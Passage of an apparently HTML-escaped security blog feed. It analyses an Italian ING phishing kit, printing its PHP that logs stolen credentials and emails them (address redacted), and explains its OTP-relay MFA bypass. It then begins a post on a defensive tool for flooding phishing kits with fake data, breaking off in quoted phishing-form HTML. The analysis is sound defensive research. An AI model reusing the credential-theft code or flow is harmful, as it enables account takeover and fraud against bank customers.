    $msg &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;| anno: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$anno&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $msg &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;| telefono: &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$telefono&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $footer &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+ ------------------------------------------+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $footer &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+ Sent from &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$v_ip&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; on &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$time&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; via &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$agent\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $footer &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;+ ------------------------------------------+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $msg &lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt; $footer;
    $_SESSION[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;login_info&amp;#39;&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $msg;

    $fp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fopen&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;*********&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;a&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// HIDING LOG FILE
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;fputs&lt;/span&gt;($fp,$data);
    &lt;span style=&#34;color:#a6e22e&#34;&gt;fclose&lt;/span&gt;($fp);
    $subject &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Poste Login Info for User: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$username&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $headers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;From: Poste Login Info &amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$my_email&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $headers &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Reply-To: Poste Login Info &amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;$my_email&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $headers &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MIME-Version: 1.0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;
    $headers &lt;span style=&#34;color:#f92672&#34;&gt;.=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Content-Type: text/plain; charset=utf-8&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\r\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;;

    &lt;span style=&#34;color:#a6e22e&#34;&gt;mail&lt;/span&gt;($my_email,$subject,$data,$headers);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After assigning the last bit of information coming from &lt;code&gt;login.php&lt;/code&gt; (the phone number) the code is now preparing the email to exfiltrate the data. The kit is taking the exfiltration email from &lt;code&gt;includes/my_email.php&lt;/code&gt; and then logging the stolen credentials in a txt file (I am not disclosing the path to prevent malicious actors to re-use the stolen credentials).&lt;/p&gt;
&lt;p&gt;Below you can find &lt;code&gt;my_email.php&lt;/code&gt; (I have replaced the Gmail address with the asterisks):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
$my_email &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;***********@gmail.com&amp;#34;&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;//////// YOUR EMAIL GOES HERE
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The comment &lt;em&gt;&amp;ldquo;YOUR EMAIL GOES HERE&amp;rdquo;&lt;/em&gt; may suggest that there are two different actors involved in this activity: one is developing the kit, while another malicious actor is using it. This may explain why there are instructions left in comments around the code base.&lt;/p&gt;
&lt;p&gt;Here is the content of the txt log file, which contains a sample of the data that the criminal will receive via email:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;+ ------------------------------------------+
+ Dati Login per
+ ------------------------------------------+
| codcliente: 1111111
| giorno: 11
| mese: 01
| anno: 1111
| telefono: 111111111111
+ ------------------------------------------+
+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+ ------------------------------------------+

+ ------------------------------------------+
+ Dati Login per
+ ------------------------------------------+
| pin: 1111111
+ ------------------------------------------+
+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+ ------------------------------------------+

+ ------------------------------------------+
+ Dati Login per
+ ------------------------------------------+
| otp: 1111111
+ ------------------------------------------+
+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+ ------------------------------------------+

+ ------------------------------------------+
+ Dati Login per
+ ------------------------------------------+
| domanda1: 1111111
| domanda2: 1111111
| domanda3: 1111111
+ ------------------------------------------+
+ Sent from ::1 on 03-03-2021 10:55:pm via Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
+ ------------------------------------------+
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We can also see a User-Agent string exposed in the log above, which may suggest what platform and browser the criminal is using to develop the kit (Chrome 88 on Windows 8).&lt;/p&gt;
&lt;h3 id=&#34;the-big-picture&#34;&gt;The big picture&lt;/h3&gt;
&lt;p&gt;Based on the logs pasted previously, it&amp;rsquo;s easy to have an idea of how the kit works:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;index.php&lt;/code&gt; -&amp;gt; check if the IP of the visitor is in a blacklist, if that&amp;rsquo;s the case, redirect the connection to google.com&lt;/li&gt;
&lt;li&gt;&lt;code&gt;login.php&lt;/code&gt; -&amp;gt; convince the victim to enter his/her client ID, phone number and birth date for &amp;ldquo;security reasons&amp;rdquo; and send them to the attacker via email. As soon as the criminal receives the stolen credentials, he/she will use them to sign in to the real ING e-banking platform.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;pin.php&lt;/code&gt; -&amp;gt; ask the victim to provide the PIN code for his account and send it via email to the criminal. Now the criminal will use it to continue the signin process to ING bank pretending to be the victim. After that, ING will send an OTP code to the victim&amp;rsquo;s phone because of the login process initiated by the criminal (which submitted the victim&amp;rsquo;s phone number).&lt;/li&gt;
&lt;li&gt;&lt;code&gt;otp.php&lt;/code&gt; -&amp;gt; ask the victim to provide the OTP code he should have received from the bank, and send it via email to the criminal. Now the criminal enters the OTP code and (if the code is not expired) he/she should have access to the victim&amp;rsquo;s account.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;domande.php&lt;/code&gt; (it means &lt;em&gt;questions&lt;/em&gt; in Italian) -&amp;gt; ask the victim to provide the answers to the security questions and send them via email to the criminal. This combination of questions/answers could be used as a backup mechanism to authenticate to ING.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;completa.php&lt;/code&gt; -&amp;gt; show a message to the victim says that it will be soon contacted by an operator.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In this process, time has a crucial role, because OTP codes are valid only for some seconds (usually 60), thus the criminal either has an automatic agent to perform the login session with ING when the stolen credentials are received, or he/she will have to perform these actions manually and &amp;ldquo;live&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;In addition, at every step, the PHP code will store the credentials obtained in the previous step in log file, e.g. the code in &lt;code&gt;pin.php&lt;/code&gt; will write the credentials obtained during the execution of &lt;code&gt;login.php&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Below is a schema with the screenshots of the mentioned pages. I didn&amp;rsquo;t include &lt;code&gt;index.php&lt;/code&gt; because it does not have any graphical elements; instead I replaced the first step with a dialog in &lt;code&gt;login.php&lt;/code&gt;, which tries to convince the user to enter the security details of his/her account.&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/ep3/diagram.png&#34;
         alt=&#34;Schema of the phishing kit&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Schema of the phishing kit&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;It&amp;rsquo;s interesting to note that the kit is performing some basic checks for some input fields (such as the birth date of the victim), but, in one of the final steps, it does not even specify which information should be entered in the form, indeed in &lt;code&gt;domande.php&lt;/code&gt; we can only see some asterisks before the input field, which - in addition - accepts only numerical data.&lt;/p&gt;
&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;In this post, we analyzed a phishing kit targeting Italian customers of ING bank.&lt;/p&gt;
&lt;p&gt;A lot of the code-base of the kit was imported from the original ING page without too much caring. Indeed, while inspecting the network connection, we can see that the kit is trying to reach out to the ING private APIs without receiving an answer (probably because the APIs are checking that the request is coming from an authorized source).&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/phishing-findings/ep3/api.png&#34;
         alt=&#34;The kit tries to access to the Italian ING APIs&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;The kit tries to access to the Italian ING APIs&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;The code includes a lot of comments and, in general, it seems that is still a work in progress; as a matter of fact, when it was online, it wasn&amp;rsquo;t able to lure many victims.&lt;/p&gt;
&lt;p&gt;The ING kit shows how some criminals are trying to bypass Multi-Factor Authentication, by sending credentials (including OTP) via email as soon as these are stolen; and, probably in case they are not able to enter the OTP quick enough, they also try to steal the security questions, which are often used as a fallback mechanism to access the account.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>PhishFlood: a poc for flooding phishing kits</title>
      <link>/posts/flooding-phishing-kits/</link>
      <pubDate>Sun, 31 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>/posts/flooding-phishing-kits/</guid>
      <description>&lt;figure&gt;&lt;img src=&#34;https://steamuserimages-a.akamaihd.net/ugc/2418873130670778483/414245F5E27783EC5F84ABBBF9E5840B641007DC/&#34;/&gt;
&lt;/figure&gt;

&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;If you use Twitter to stay up to date with the latest security news, you may have noticed a community of researchers reporting phishing websites and scam pages everyday (if you want to follow them, &lt;em&gt;phishunt.io&lt;/em&gt; have a good list of profiles in their &lt;a href=&#34;https://phishunt.io/community/&#34;&gt;community section&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;Unfortunately, reporting these websites is not always very effective. In many cases the phishing pages are removed only after 24-48 hours of being reported, and at that point they may have already stolen credentials from a lot of victims.
In order to maximize their effectiveness in few hours, these campaigns are distributed via SMS or email, urging the potential victim to perform a &amp;ldquo;quick action&amp;rdquo;.&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;https://assets.publishing.service.gov.uk/government/uploads/system/uploads/image_data/file/97661/DCDT-11434.JPG&#34;
         alt=&#34;A SMS used to distribute a phishing campaign. Picture from gov.uk&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;A SMS used to distribute a phishing campaign. &lt;a href=&#34;https://www.gov.uk/government/publications/phishing-and-bogus-emails-hm-revenue-and-customs-examples/phishing-emails-and-bogus-contact-hm-revenue-and-customs-examples&#34;&gt;Picture from gov.uk&lt;/a&gt;&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;In order to make it more difficult for threat actors, I decided to work on a proof of concept of a tool that aims to pollute the data of phishing victims with random information, so that actors will have to either validate the data to discover which are authentic, or discard the database.&lt;/p&gt;
&lt;h2 id=&#34;background&#34;&gt;Background&lt;/h2&gt;
&lt;p&gt;For this proof of concept, I choose to target a particular phishing kit, which I have reported multiple times:&lt;/p&gt;
&lt;figure&gt;&lt;img src=&#34;/images/posts/phishflood/phishing-kit.png&#34;
         alt=&#34;The target of this poc: a phishing page for the Italian bank Intesa Sanpaolo&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;The target of this poc: a phishing page for the Italian bank Intesa Sanpaolo&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;This kit is particularly suitable for this experiment, because it exposes the logs of the victims in a text file that is often left unprotected online.&lt;/p&gt;
&lt;p&gt;This poses an additional security risk for the victims, because their credentials are not only in the hands of the actor who deployed the kit, but are also potentially accessible to other actors that can crawl the web for phishing kits alredy deployed by others.&lt;/p&gt;
&lt;p&gt;However, for the sake of this experiment, having the logs exposed makes it easier to verify if the code works as expected.&lt;/p&gt;
&lt;h2 id=&#34;the-phishing-page&#34;&gt;The phishing page&lt;/h2&gt;
&lt;p&gt;In this case, we don&amp;rsquo;t have access to the PHP code of the kit, because I couldn&amp;rsquo;t find the zip in these domains. However I would be interested in analyzing it, so if you have it, please let me know!&lt;/p&gt;
&lt;p&gt;Even if we don&amp;rsquo;t have access to the PHP, we have everything we need in the HTML of the phishing page. Here is the form for entering the credentials:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;div&lt;/span&gt;&amp;gt;
    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;form&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;command&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;form-group&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;action&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/core/login.php&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;method&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;post&amp;#34;&lt;/span&gt;
	    &lt;span style=&#34;color:#a6e22e&#34;&gt;autocomplete&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;off&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt; /&amp;gt;
	    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;
	        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;h2&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;label&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;camp1&amp;#34;&lt;/span&gt;&amp;gt;Codice Titolare&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;label&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;h2&lt;/span&gt;&amp;gt;
	    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;
	    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class &lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;form-control&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;number&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;codice&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_camp1&amp;#34;&lt;/span&gt;
	        &lt;span style=&#34;color:#a6e22e&#34;&gt;required&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tabindex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;minlength&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;4&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;maxlength&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;10&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt; /&amp;gt;
	    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;
	        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;strong&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;label&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;camp2&amp;#34;&lt;/span&gt;&amp;gt;PIN&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;label&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;strong&lt;/span&gt;&amp;gt;
	    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;
	    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;form-control&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;number&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;
	        &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_camp2&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;required&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tabindex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt; /&amp;gt;
	    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;
	        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;strong&lt;/span&gt;&amp;gt; &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;label&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;camp3&amp;#34;&lt;/span&gt;&amp;gt;Numero di telefono&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;label&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;strong&lt;/span&gt;&amp;gt;
	    &amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;
	    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;form-control&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;number&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cellulare&amp;#34;&lt;/span&gt;
	        &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;_camp3&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;required&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tabindex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;3&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;br&lt;/span&gt; /&amp;gt;
	    &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;p&lt;/span&gt;&amp;gt;
	        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;strong&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;label&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;for&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;camp4&amp;#34;&lt;/span&gt;&amp;gt;Se sei cliente Fideuram seleziona
	    	    la casella in basso&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;label&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;strong&lt;/span&gt;&amp;gt;
	        &amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;input&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;class&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;form-check-label&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;checkbox&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fideuram&amp;#34;&lt;/span&gt;
